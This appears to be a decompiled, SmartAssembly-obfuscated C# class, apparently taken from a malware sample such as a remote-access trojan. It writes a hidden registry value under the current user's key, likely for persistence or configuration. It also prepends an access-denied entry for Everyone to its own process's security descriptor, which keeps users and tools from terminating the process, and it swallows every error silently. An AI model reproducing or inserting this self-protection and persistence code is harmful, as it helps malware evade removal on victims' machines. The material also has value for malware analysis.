using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace FEPAnxLYcpgz;

internal sealed class IOXgkZDcWiV
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr fuwkPzECNaav, int BAEfvYJzwFn, [Out] byte[] WcDmNwquqvSQ, uint KoPmudBRdggfzL, out uint dlMDAVpnwTpO);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr HlgFRZvtxtww, int MTkiqfshuDg, [In] byte[] QVovNTiHdcRF);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void jmZwDBLiMbtL(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(frAELqEtncDC.aTyvnaQgFklB(getString_0(107478044)));
			registryKey.SetValue(frAELqEtncDC.aTyvnaQgFklB(getString_0(107477395)), getString_0(107396576));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor yfNgnXosDNL(IntPtr intptr_0)
	{
		byte[] wcDmNwquqvSQ = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, wcDmNwquqvSQ, 0u, out var dlMDAVpnwTpO);
		if ((long)dlMDAVpnwTpO > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, wcDmNwquqvSQ = new byte[dlMDAVpnwTpO], dlMDAVpnwTpO, out dlMDAVpnwTpO))
		{
			return null;
		}
		return new RawSecurityDescriptor(wcDmNwquqvSQ, 0);
	}

	private void xZrFrixAlMRsX(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void GxqnNBtZdAGx()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = yfNgnXosDNL(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			xZrFrixAlMRsX(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static IOXgkZDcWiV()
	{
		Strings.CreateGetStringDelegate(typeof(IOXgkZDcWiV));
	}
}
